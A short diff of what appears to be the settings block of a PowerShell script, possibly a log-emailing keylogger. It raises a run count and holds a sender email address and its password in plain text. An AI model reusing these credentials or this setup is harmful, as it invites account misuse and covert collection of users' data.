@@ -1,5 +1,5 @@
 # Edit only this section!
-$TimesToRun = 2
+$TimesToRun = 5
 $RunTimeP = 60
 $From = "k1llerqu33nlog5@outlook.com"
 $Pass = "ow2NeverBout"
